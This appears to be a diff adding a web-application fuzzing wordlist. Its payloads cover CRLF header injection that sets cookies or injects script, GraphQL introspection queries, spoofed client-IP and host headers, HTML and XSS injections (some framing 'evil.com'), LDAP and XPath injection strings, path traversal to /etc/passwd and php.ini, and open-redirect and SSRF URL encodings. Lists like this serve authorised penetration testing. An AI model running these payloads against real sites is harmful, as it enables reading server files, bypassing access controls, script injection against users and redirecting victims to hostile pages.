+/%0D%0ASet-Cookie:crlfinjection=rahul
+/%0D%0ASet-Cookie:crlfinjection=test
+%0D%20Header-Test:BLATRUC
+%0DHeader-Test:BLATRUC
+%20%0AHeader-Test:BLATRUC
+%20%0D%0AHeader-Test:BLATRUC
+/%20%0D%0ASet-Cookie:whoami=rahul
+/%20%0D%0ASet-Cookie:whoami=test
+%20%0DHeader-Test:BLATRUC
+%23%0AHeader-Test:BLATRUC
+%23%0D%0AHeader-Test:BLATRUC
+%23%0DHeader-Test:BLATRUC
+%23%OAHeader-Test:BLATRUC
+%250AHeader-Test:BLATRUC
+%25250AHeader-Test:BLATRUC
+%25%30%61Header-Test:BLATRUC
+%25%30AHeader-Test:BLATRUC
+/%2F%2E%2E%0D%0ASet-Cookie:whoami=rahul
+/%2F%2E%2E%0D%0ASet-Cookie:whoami=test
+%3F%0AHeader-Test:BLATRUC
+%3F%0D%0AHeader-Test:BLATRUC
+%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+%3F%0DHeader-Test:BLATRUC
+%5cr%5cnHeader-Test:BLATRUC
+crlf%0A%20Header-Test:BLATRUC
+crlf%0AHeader-Test:BLATRUC
+crlf%0D%0A%09Header-Test:BLATRUC
+crlf%0D%0A%20Header-Test:BLATRUC
+crlf%0D%0AHeader-Test:BLATRUC
+crlf%0D%20Header-Test:BLATRUC
+crlf%0DHeader-Test:BLATRUC
+crlf%20%0AHeader-Test:BLATRUC
+crlf%20%0D%0AHeader-Test:BLATRUC
+crlf%20%0DHeader-Test:BLATRUC
+crlf%23%0AHeader-Test:BLATRUC
+crlf%23%0D%0AHeader-Test:BLATRUC
+crlf%23%0DHeader-Test:BLATRUC
+crlf%23%OAHeader-Test:BLATRUC
+crlf%3F%0AHeader-Test:BLATRUC
+crlf%3F%0D%0AHeader-Test:BLATRUC
+crlf%3F%0DHeader-Test:BLATRUC
+crlf%5cr%5cnHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
+crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+crlf\r\nHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
+%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
+/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=rahul
+/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=thecyberneh
+/%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+/google.com/%2F..%0D%0AHeader-Test:BLATRUC
+ \r\n Header-Test:BLATRUC
+\r\n Header-Test:BLATRUC
+\r\nHeader-Test:BLATRUC
+%u000AHeader-Test:BLATRUC
+/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC
+//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC
+/嘍嘊Set-Cookie:whoami=thecyberneh嘍嘊嘍嘊嘍嘊<script>alert(1);</script>
+/嘍嘊Set-Cookie:whoami=thecyberneh嘍嘊嘍嘊嘍嘊嘼script嘾alert(1);嘼/script嘾
+
+=> Further:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md
+--------------
+
+{__schema{types{name}}}
+{__schema{types{name}}}
+{__schema}
+{}
+{thisdefinitelydoesnotexist}
+fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
+__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
+{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
+{"query":"\n    query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}
+
+X-Forwarded-For: evil-website.com
+X-Forwarded-Host: evil-website.com
+X-Client-IP: evil-website.com
+X-Remote-IP: evil-website.com
+X-Remote-Addr: evil-website.com
+X-Host: evil-website.com
+
+<h1>HTML</h1>
+<h1>html</h1>
+<h2>HTML</h2>
+<h3>HTML</h3>
+<h4>HTML</h4>
+<h5>HTML</h5>
+<h6>HTML</h6>
+<pre>HTML</pre>
+<p>HTML</p>
+<i>HTML</i>
+<a href="https://www.google.com">HTML</a>
+<abbr title="HTML">HTML</abbr>
+<acronym title="Armour Infosec">AI</acronym>
+<address>address,address</address>
+<article><h2>Armour Infosec</h2></article>
+<audio controls><source src="demo.ogg" type="audio/ogg"><source src="demo.mp3" type="audio/mpeg"></audio>
+<b>HTML</b>
+<h1>HTML</h1><!--
+qq<h1>HTML</h1>
+qq<h1>HTML</h1>qq
+$$\<u>HTML</u>{}$$
+%3Ch1%3EHTML%3C%2Fh1%3E
+&lt;h1&gt;HTML&lt;/h1&gt;
+&#60;h1&#62;HTML&#60;/h1&#62;
+<iframe src="https://www.google.com" title="test"></iframe>
+123<h1>HTML</h1>
+<h1>HTML</h1>123
+123<h1>HTML</h1>123
+%253Ch1%253EHTML%253C%252Fh1%253E
+<iframe id="if1" src="https://www.google.com"></iframe>
+<iframe id="if2" src="https://www.google.com"></iframe>
+PGgxPkhUTUw8L2gxPg==
+UEdneFBraFVUVXc4TDJneFBnPT0=
+<<h1>HTML</h1>
+<<h1>HTML</h1>>
+<<h1>html</h1>>
+%253Ch1%253EHTML%253C%252Fh1%253E<h1>Html</h1>
+<pre>HTML</pre>
+<p>HTMLinjection here</p>
+<i>HTML</i>
+<u>Html</u>
+<mark>Html</mark>
+<a href="https://www.google.com">HTML</a>
+<b>HTML</b>
+<h1>HTML</h1><!--
+qq<h1>HTML</h1>
+qq<h1>HTML</h1>qq
+%3Ch1%3EHTML%3C%2Fh1%3E
+%253Ch1%253EHTML%253C%252Fh1%253E
+&lt;h1&gt;HTML&lt;/h1&gt;
+&amp;lt;h1&amp;gt;HTML&amp;lt;/h1&amp;gt;
+&#60;h1&#62;HTML&#60;/h1&#62;
+<iframe src="https://www.google.com" title="test"></iframe>
+123<h1>HTML</h1>
+<h1>HTML</h1>123
+123<h1>HTML</h1>123
+%253Ch1%253EHTML%253C%252Fh1%253E
+<iframe id="if1" src="https://www.google.com"></iframe>
+<iframe id="if2" src="https://www.google.com"></iframe>
+<<h1>HTML</h1>
+<<h1>HTML</h1>>
+<<h1>html</h1>>
+%253Ch1%253EHTML%253C%252Fh1%253E
+<div>HTML</div>
+%3Ci%3Ehtml%3C%2Fi%3E
+%253Ci%253Ehtml%253C%252Fi%253E
+<style>h1 {color:red;}</style><h1>This is a heading</h1>
+<textarea id="HTML" name="HTML" rows="4" cols="50">Html injected</textarea>
+<head><base href="https://www.google.com" target="_blank"></head>
+<span style="color:blue;font-weight:bold">html</span>
+<abbr title="HTML">HTML</abbr>
+<acronym title="Armour Infosec">AI</acronym>
+<address>address,address</address>
+<article><h2>Armour Infosec</h2></article>
+<div>HTML</div>
+%3Ci%3Ehtml%3C%2Fi%3E
+%253Ci%253Ehtml%253C%252Fi%253E
+<body style="background-color:red">
+
+<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
+xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>
+<iframe src=javascript:alert(1)>
+<iframe src=https://evil.com>
+CF-Connecting-IP: ::1
+CF-Connecting-IP: 127.0.0.1
+CF-Connecting-IP: localhost
+Client-IP: ::1
+Client-IP: 127.0.0.1
+Client-IP: localhost
+Fastly-Client-IP: ::1
+Fastly-Client-IP: 127.0.0.1
+Fastly-Client-IP: localhost
+Forwarded: 127.0.0.1
+Forwarded: for="::1"
+Forwarded: for=localhost
+True-Client-IP: ::1
+True-Client-IP: 127.0.0.1
+True-Client-IP: localhost
+X-Client-Host: ::1
+X-Client-Host: 127.0.0.1
+X-Client-Host: localhost
+X-Client-IP: ::1
+X-Client-IP: 127.0.0.1
+X-Client-IP: localhost
+X-Cluster-Client-IP: ::1
+X-Cluster-Client-IP: 127.0.0.1
+X-Cluster-Client-IP: localhost
+X-Forwarded-By: ::1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-By: localhost
+X-Forwarded-Client-IP: ::1
+X-Forwarded-Client-IP: 127.0.0.1
+X-Forwarded-Client-IP: localhost
+X-Forwarded-For: ::1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For-Original: ::1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For-Original: localhost
+X-Forwarded-Host: ::1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Forwarded-Port: 443
+X-Forwarded-Proto: http
+X-Forwarded-Server: ::1
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded-Server: localhost
+X-Host: ::1
+X-Host: 127.0.0.1
+X-Host: localhost
+X-HTTP-Client-IP: ::1
+X-HTTP-Client-IP: 127.0.0.1
+X-HTTP-Client-IP: localhost
+X-HTTP-Forwarded-For: ::1
+X-HTTP-Forwarded-For: 127.0.0.1
+X-HTTP-Forwarded-For: localhost
+X-Original-Forwarded-For: ::1
+X-Original-Forwarded-For: 127.0.0.1
+X-Original-Forwarded-For: localhost
+X-Original-Host: ::1
+X-Original-Host: 127.0.0.1
+X-Original-Host: localhost
+X-Original-IP: ::1
+X-Original-IP: 127.0.0.1
+X-Original-IP: localhost
+X-Original-Remote-Addr: ::1
+X-Original-Remote-Addr: 127.0.0.1
+X-Original-Remote-Addr: localhost
+X-Originating-IP: ::1
+X-Originating-IP: 127.0.0.1
+X-Originating-IP: localhost
+X-Proxy-Client-IP: ::1
+X-Proxy-Client-IP: 127.0.0.1
+X-Proxy-Client-IP: localhost
+X-Proxy-IP: ::1
+X-Proxy-IP: 127.0.0.1
+X-Proxy-IP: localhost
+X-ProxyUser-IP: ::1
+X-ProxyUser-IP: 127.0.0.1
+X-ProxyUser-IP: localhost
+X-Real-IP: ::1
+X-Real-IP: 127.0.0.1
+X-Real-IP: localhost
+X-Real-Remote-IP: ::1
+X-Real-Remote-IP: 127.0.0.1
+X-Real-Remote-IP: localhost
+X-Remote-Addr: ::1
+X-Remote-Addr: 127.0.0.1
+X-Remote-Addr: localhost
+X-Remote-IP: ::1
+X-Remote-IP: 127.0.0.1
+X-Remote-IP: localhost
+X-Scheme: 127.0.0.1
+X-Scheme: http
+X-True-IP: ::1
+X-True-IP: 127.0.0.1
+X-True-IP: localhost
+
+!
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+\21
+\26
+\28
+\29
+&
+(
+)
+*
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+(*)*)
+*)*
+*/*
+*|
+/
+//
+//*
+@*
+|
+admin*
+admin*)((|userpassword=*)
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+
+/etc/opt/ipf/ipnat.conf
+....//....//etc/passwd
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd{{
+../../../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../etc/passwd?
+../../../../../etc/passwd
+../../../../etc/passwd
+../../../etc/passwd
+../../etc/passwd
+../etc/passwd
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd^^
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/./././././././././././etc/passwd
+/etc/passwd
+/etc/passwd?
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+etc/passwd
+....//....//....//....//....//....//....//etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../etc/passwd%00
+../../../../../../../../../etc/passwd%00
+../../../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00
+../../../../../../etc/passwd%00
+../../../../../etc/passwd%00
+../../../../etc/passwd%00
+../../../etc/passwd%00
+../../etc/passwd%00
+../etc/passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+/etc/passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+etc/passwd%00
+/../../../../../../../../etc/passwd%00.gif
+/../../../../../../../../../../../etc/passwd%00.html
+../../../../etc/passwd%00jpg
+/../../../../../../../../../../../etc/passwd%00.jpg
+../../../../../../etc/passwd&=%3C%3C%3C%3C
+/etc/php4.4/fcgi/php.ini
+/etc/php4/apache2/php.ini
+/etc/php4/apache/php.ini
+/etc/php4/cgi/php.ini
+/etc/php5/apache2/php.ini
+/〱google.com
+〱google.com
+/〱localdomain.pw
+〱localdomain.pw
+/〵google.com
+〵google.com
+/〵localdomain.pw
+〵localdomain.pw
+/ゝgoogle.com
+ゝgoogle.com
+/ゝlocaldomain.pw
+ゝlocaldomain.pw
+/ーgoogle.com
+ーgoogle.com
+/ｰgoogle.com
+ｰgoogle.com
+/ーlocaldomain.pw
+ーlocaldomain.pw
+/ｰlocaldomain.pw
+ｰlocaldomain.pw
+/%09/example.com
+//%09/example.com
+///%09/example.com
+////%09/example.com
+/%09/example.com@google.com
+//%09/example.com@google.com
+///%09/example.com@google.com
+////%09/example.com@google.com
+/%09/google.com
+//%09/google.com
+///%09/google.com
+////%09/google.com
+/%09/javascript:alert(1)
+/%09/javascript:alert(1);
+/%09/localdomain.pw
+//%09/localdomain.pw
+///%09/localdomain.pw
+////%09/localdomain.pw
+/%09/www.whitelisteddomain.tld@google.com
+//%09/www.whitelisteddomain.tld@google.com
+///%09/www.whitelisteddomain.tld@google.com
+////%09/www.whitelisteddomain.tld@google.com
+/%09/www.whitelisteddomain.tld@localdomain.pw
+//%09/www.whitelisteddomain.tld@localdomain.pw
+///%09/www.whitelisteddomain.tld@localdomain.pw
+////%09/www.whitelisteddomain.tld@localdomain.pw
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+%19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529
+/%2f%2f%2fbing.com%2f%3fwww.omise.co
+/%2f%2fexample.com
+/%2f%2fgoogle.com
+/%2f%2flocaldomain.pw
+/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+//%2fxgoogle.com
+//3H6k7lIAiqjfNeN@example.com+@google.com/
+//3H6k7lIAiqjfNeN@example.com@google.com/
+//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/
+//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/
+/%5cexample.com
+//%5cexample.com
+///%5cexample.com
+////%5cexample.com
+/%5cexample.com@google.com
+//%5cexample.com@google.com
+///%5cexample.com@google.com
+////%5cexample.com@google.com
+/%5cgoogle.com
+//%5cgoogle.com
+///%5cgoogle.com
+////%5cgoogle.com
+/%5cjavascript:alert(1)
+/%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+/%5clocaldomain.pw
+//%5clocaldomain.pw
+///%5clocaldomain.pw
+////%5clocaldomain.pw
+/%5cwww.whitelisteddomain.tld@google.com
+//%5cwww.whitelisteddomain.tld@google.com
+///%5cwww.whitelisteddomain.tld@google.com
+////%5cwww.whitelisteddomain.tld@google.com
+/%5cwww.whitelisteddomain.tld@localdomain.pw
+//%5cwww.whitelisteddomain.tld@localdomain.pw
+///%5cwww.whitelisteddomain.tld@localdomain.pw
+////%5cwww.whitelisteddomain.tld@localdomain.pw
+%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+";alert(0);//
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+data:www.whitelisteddomain.tld;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
+/.example.com
+/////example.com
+/////example.com/
+////\;@example.com
+////example.com/
+////example.com//
+///\;@example.com
+///example.com
+///example.com/
+///example.com//
+//example.com
+//example.com/
+//example.com//
+/<>//example.com
+/\/\/example.com/
+/\/example.com/
+////example.com/%2e%2e
+///example.com/%2e%2e
+//example.com/%2e%2e
+////example.com/%2e%2e%2f
+///example.com/%2e%2e%2f
+//example.com/%2e%2e%2f
+////example.com/%2f..
+///example.com/%2f..
+//example.com/%2f..
+////example.com/%2f%2e%2e
+///example.com/%2f%2e%2e
+//example.com/%2f%2e%2e
+/example.com/%2f%2e%2e
+////example.com@google.com/
+////example.com@google.com//
+///example.com@google.com/
+///example.com@google.com//
+//example.com@google.com/
+//example.com@google.com//
+////example.com@google.com/%2e%2e
+///example.com@google.com/%2e%2e
+////example.com@google.com/%2e%2e%2f
+///example.com@google.com/%2e%2e%2f
+//example.com@google.com/%2e%2e%2f
+////example.com@google.com/%2f..
+///example.com@google.com/%2f..
+//example.com@google.com/%2f..
+////example.com@google.com/%2f%2e%2e
+///example.com@google.com/%2f%2e%2e
+//example.com@google.com/%2f%2e%2e
+//example.com+&@google.com#+@example.com/
+//example.com@https:///google.com/%2e%2e
+//google%00.com
+/.google.com
+/////google.com/
+////google.com/
+////google.com//
+///\;@google.com
+///google.com
+///google.com/
+///google.com//
+//;@google.com
+//google.com
+//google.com/
+//google.com//
+/\/google.com/
+<>//google.com
+@google.com
+\/\/google.com/
+////google.com/%2e%2e
+///google.com/%2e%2e
+////google.com/%2e%2e%2f
+///google.com/%2e%2e%2f
+//google.com/%2e%2e%2f
+////google.com/%2f..
+///google.com/%2f..
+//google.com/%2f..
+////google.com/%2f%2e%2e
+///google.com/%2f%2e%2e
+//google.com/%2f%2e%2e
+/google.com/%2f%2e%2e
+//google.com:80#@example.com/
+//google.com:80?@example.com/
+//google.com\@example.com
+//google.com\texample.com/
+//google.com\@www.whitelisteddomain.tld
+//google%E3%80%82com
+http://00330.00072.0000326.00000316
+http:00330.00072.0000326.00000316
+http://00330.0x3a.54990
+http:00330.0x3a.54990
+http://00330.3856078
+http:00330.3856078
+http://0330.072.0326.0316
+http:0330.072.0326.0316
+http://0xd8.072.54990
+http:0xd8.072.54990
+http://0xd8.0x3a.0xd6.0xce
+http:0xd8.0x3a.0xd6.0xce
+http://0xd8.3856078
+http:0xd8.3856078
+http://0xd83ad6ce
+http:0xd83ad6ce
+http://[::216.58.214.206]
+http:[::216.58.214.206]
+http://3627734734
+http:3627734734
+http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http://3H6k7lIAiqjfNeN@00330.0x3a.54990
+http:3H6k7lIAiqjfNeN@00330.0x3a.54990
+http://3H6k7lIAiqjfNeN@00330.3856078
+http:3H6k7lIAiqjfNeN@00330.3856078
+http://3H6k7lIAiqjfNeN@0330.072.0326.0316
+http:3H6k7lIAiqjfNeN@0330.072.0326.0316
+http://3H6k7lIAiqjfNeN@0xd8.072.54990
+http:3H6k7lIAiqjfNeN@0xd8.072.54990
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@0xd8.3856078
+http:3H6k7lIAiqjfNeN@0xd8.3856078
+http://3H6k7lIAiqjfNeN@0xd83ad6ce
+http:3H6k7lIAiqjfNeN@0xd83ad6ce
+http://3H6k7lIAiqjfNeN@[::216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@3627734734
+http:3H6k7lIAiqjfNeN@3627734734
+http://3H6k7lIAiqjfNeN@472.314.470.462
+http:3H6k7lIAiqjfNeN@472.314.470.462
+http://3H6k7lIAiqjfNeN@example.com+@google.com/
+http://3H6k7lIAiqjfNeN@example.com@google.com/
+http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/
+http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/
+http://472.314.470.462
+http:472.314.470.462
+/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+/http://example.com
+/http:/example.com
+http://example.com@00330.00072.0000326.00000316
+http:example.com@00330.00072.0000326.00000316
+http://example.com@00330.0x3a.54990
+http:example.com@00330.0x3a.54990
+http://example.com@00330.3856078
+http:example.com@00330.3856078
+http://example.com@0330.072.0326.0316
+http:example.com@0330.072.0326.0316
+http://example.com@0xd8.072.54990
+http:example.com@0xd8.072.54990
+http://example.com@0xd8.0x3a.0xd6.0xce
+http:example.com@0xd8.0x3a.0xd6.0xce
+http://example.com@0xd8.3856078
+http:example.com@0xd8.3856078
+http://example.com@0xd83ad6ce
+http:example.com@0xd83ad6ce
+http://example.com@[::216.58.214.206]
+http:example.com@[::216.58.214.206]
+http://example.com%2egoogle.com/
+http://example.com@3627734734
+http:example.com@3627734734
+http://example.com@472.314.470.462
+http:example.com@472.314.470.462
+http://example.com:80%40google.com/
+http://example.com@[::ffff:216.58.214.206]
+http:example.com@[::ffff:216.58.214.206]
+http://example.com+&@google.com#+@example.com/
+http://[::ffff:216.58.214.206]
+http:[::ffff:216.58.214.206]
+/http://google.com
+/http:/google.com
+http://;@google.com
+http://google.com%23.example.com/
+http://google.com%2f%2f.example.com/
+http://google.com%3F.example.com/
+http://google.com%5c%5c.example.com/
+http://google.com:80#@example.com/
+http://google.com:80?@example.com/
+http://google.com:80#@www.whitelisteddomain.tld/
+http://google.com:80?@www.whitelisteddomain.tld/
+http://google.com\texample.com/
+/http://localdomain.pw
+/http:/localdomain.pw
+http://.localdomain.pw
+http://;@localdomain.pw
+http://localdomain.pw%23.www.whitelisteddomain.tld/
+http://localdomain.pw%2f%2f.www.whitelisteddomain.tld/
+http://localdomain.pw%3F.www.whitelisteddomain.tld/
+http://localdomain.pw%5c%5c.www.whitelisteddomain.tld/
+http://localdomain.pw:80#@www.whitelisteddomain.tld/
+http://localdomain.pw:80?@www.whitelisteddomain.tld/
+http://localdomain.pw\twww.whitelisteddomain.tld/
+/https://%09/example.com
+https://%09/example.com@google.com
+https://%09/google.com
+https://%09/localdomain.pw
+https://%09/www.whitelisteddomain.tld@google.com
+https://%09/www.whitelisteddomain.tld@localdomain.pw
+/https:/%5cexample.com/
+/https://%5cexample.com
+/https://%5cexample.com@google.com
+https://%5cexample.com@google.com
+/https:/%5cgoogle.com/
+/https://%5cgoogle.com
+https://%5cgoogle.com
+/https:/%5clocaldomain.pw/
+/https://%5clocaldomain.pw
+https://%5clocaldomain.pw
+/https://%5cwww.whitelisteddomain.tld@google.com
+https://%5cwww.whitelisteddomain.tld@google.com
+/https://%5cwww.whitelisteddomain.tld@localdomain.pw
+https://%5cwww.whitelisteddomain.tld@localdomain.pw
+//https://example.com//
+/https://example.com
+/https://example.com/
+/https://example.com//
+/https:example.com
+//https:///example.com/%2e%2e
+/https:///example.com/%2e%2e
+/https://example.com/%2e%2e
+//https://example.com/%2e%2e%2f
+/https://example.com/%2e%2e%2f
+/https://example.com/%2f..
+/https:///example.com/%2f%2e%2e
+/https://example.com/%2f%2e%2e
+//https://example.com@google.com//
+/https://example.com@google.com/
+https://example.com@google.com
+https://example.com@google.com/
+https://example.com@google.com//
+/https://example.com@google.com/%2e%2e
+https:///example.com@google.com/%2e%2e
+//https://example.com@google.com/%2e%2e%2f
+https://example.com@google.com/%2e%2e%2f
+/https://example.com@google.com/%2f..
+https://example.com@google.com/%2f..
+/https:///example.com@google.com/%2f%2e%2e
+/https://example.com@google.com/%2f%2e%2e
+https:///example.com@google.com/%2f%2e%2e
+https://example.com@google.com/%2f%2e%2e
+https://example.com/https://google.com/
+//https://google.com//
+/https://google.com/
+https://google.com
+https://google.com/
+https://google.com//
+https:google.com
+//https:///google.com/%2e%2e
+/https://google.com/%2e%2e
+https:///google.com/%2e%2e
